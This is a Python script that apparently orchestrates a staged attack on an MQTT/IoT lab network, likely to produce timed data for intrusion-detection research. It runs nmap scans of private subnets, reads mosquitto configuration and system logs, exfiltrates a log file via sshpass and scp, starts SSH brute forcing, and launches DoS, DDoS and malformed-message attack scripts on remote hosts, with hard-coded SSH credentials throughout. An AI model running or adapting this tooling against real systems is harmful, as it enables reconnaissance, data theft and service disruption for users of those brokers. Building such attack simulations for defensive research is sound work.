import random

import pytz
import subprocess
import ssh_auto_access as ssh
import time
from datetime import datetime
import os


# def initial_access(phase_number, pause, attack_name):
#    start_time = datetime.now(tz=pytz.UTC)
#    commands = "sudo nmap -sS -T3 -Pn 192.168.1.0/24;sudo nmap -sS -T3  -Pn 192.168.0.0/24;sudo nmap  -sS -T3 -Pn 10.0.0.0/24"
#    command_list = commands.split(';')
#
#    for command in command_list:
#        ssh.ssh_commands("10.0.0.7", "ope", "maint", [command], 1, 5, "./out.log", 6666)

#        time.sleep(20)
#    end_time = datetime.now(tz=pytz.UTC)
#    experiment = {"phase_number": phase_number,
#                  "attack_name": attack_name,
#                  "phase_name": "network_discovery",
#                  "start_time": start_time,
#                  "end_time": end_time,
#                  "command": command}

#   time.sleep(pause)
#    return experiment

def initial_access(hostname, phase_number, command_list, attack_name, inf_conclusion_pause=0, sup_conclusion_pause=20,
                   pause_commands=False, inf_interval_pause=0,
                   sup_interval_pause=10):
    a_conclusion_pause = random.randint(inf_conclusion_pause, sup_conclusion_pause)
    start_time = datetime.now(tz=pytz.UTC)
    if pause_commands:
        for command in command_list:
            ssh.ssh_commands(hostname, "ope", "maint", [command], 1, 5, "./out.log", 6666)
            a_interval_pause = random.randint(inf_interval_pause, sup_interval_pause)
            time.sleep(a_interval_pause)
    else:
        ssh.ssh_commands(hostname, "ope", "maint", command_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {"phase_number": phase_number,
                  "attack_name": attack_name,
                  "phase_name": "network_discovery",
                  "start_time": start_time,
                  "end_time": end_time,
                  "command": "network_scan"}

    time.sleep(a_conclusion_pause)
    return experiment


# def mqtt_discovery(phase_number, pause, attack_name):
#    commands = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;sudo /usr/bin/nmap -sS -T3 -Pn -p 1883,8883 10.0.0.0/24;sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24;sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
#    command_list = commands.split(';')
#    start_time = datetime.now(tz=pytz.UTC)
#    ssh.ssh_commands("10.0.0.7", "ope", "maint", command_list[0:5], 1, 5, "./out.log", 6666)
#    time.sleep(3)

#    for command in command_list[6:]:
#        ssh.ssh_commands("10.0.0.7", "ope", "maint", [command], 1, 5, "./out.log", 6666)
#       time.sleep(20)
#    end_time = datetime.now(tz=pytz.UTC)
#    experiment = {
#        "phase_number": phase_number,
#        "attack_name": attack_name,
#        "phase_name": "mqtt_discovery",
#        "start_time": start_time,
#        "end_time": end_time,
#        "command": "file_search"
#    }
#
#    time.sleep(pause)
#    return experiment


def mqtt_discovery(hostname, phase_number, command_list, attack_name, inf_conclusion_pause=0, sup_conclusion_pause=20,
                   pause_commands=False,
                   inf_interval_pause=0, sup_interval_pause=10, start_pausing=-1, interval=0):
    start_time = datetime.now(tz=pytz.UTC)
    a_conclusion_pause = random.randint(inf_conclusion_pause, sup_conclusion_pause)
    if pause_commands or start_pausing >= len(command_list):
        if start_pausing >= 0:
            ssh.ssh_commands(hostname, "ope", "maint", command_list[0:start_pausing], 1, 5, "./out.log", 6666)
            time.sleep(interval)
        for command in command_list[start_pausing + 1:]:
            ssh.ssh_commands(hostname, "ope", "maint", [command], 1, 5, "./out.log", 6666)
            a_interval_pause = random.randint(inf_interval_pause, sup_interval_pause)
            time.sleep(a_interval_pause)
    else:
        ssh.ssh_commands(hostname, "ope", "maint", command_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "mqtt_discovery",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(a_conclusion_pause)
    return experiment


def exfiltrate_scp(hostname, username, password, phase_number, attack_name, pause):
    start_time = datetime.now(tz=pytz.UTC)
    completed_process = subprocess.run(
        f'sshpass -p "{password}" scp -r {username}@{hostname}:/mqtt_sub.log ./exfiltrated_data.txt', shell=True,
        capture_output=True, text=True, timeout=60)
    if completed_process.returncode == 0:
        print("Data exfiltration successful:")
        with open("./exfiltrated_data.txt") as f:
            for line in f:
                print(line)
    else:
        print("Data exfiltration failed:")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "exfiltrate_scp",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def brute_force(phase_number, attack_name, pause, is_distributed=False, action_type='m'):
    start_time = datetime.now(tz=pytz.UTC)
    if is_distributed:
        command_line_input = '--distributed'
    else:
        command_line_input = '--no-distributed'
    command_line_input += ' -a ' + action_type

    os.system('python3 ssh_brute_force.py ' + command_line_input)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "ssh_brute_force",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def zero_len(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 zero_len_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "zero_len",
        "phase_name": "zero_len",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def qos_mid_dos(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "sudo python3 qos_mid_dos.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "qos_mid_dos",
        "phase_name": "qos_mid_dos",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(pause)

    return experiment


def dollar_char(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 dollar_char_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "dollar_char",
        "phase_name": "dollar_char",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def empty_connection_dos(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 empty_connection_ddos.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "empty_connection_dos",
        "phase_name": "empty_connection_dos",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def empty_connection_ddos(hostname_list, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 empty_connection_ddos.py"
    commands_list = commands.split(';')
    if hostname_list:
        for hostname in hostname_list:
            ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "empty_connection_ddos",
        "phase_name": "empty_connection_ddos",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def slash_char(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 slash_char_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "slash_char",
        "phase_name": "slash_char",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def user_property_dos(hostname, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 user_property_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "user_property_dos",
        "phase_name": "user_property_dos",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment


def user_property_ddos(hostname_list, phase_number, pause):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 user_property_attack.py"
    commands_list = commands.split(';')
    if hostname_list:
        for hostname in hostname_list:
            ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log", 6666)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "user_property_ddos",
        "phase_name": "user_property_ddos",
        "start_time": start_time,
        "end_time": end_time,
    }
    time.sleep(random.randint(0, pause))

    return experiment
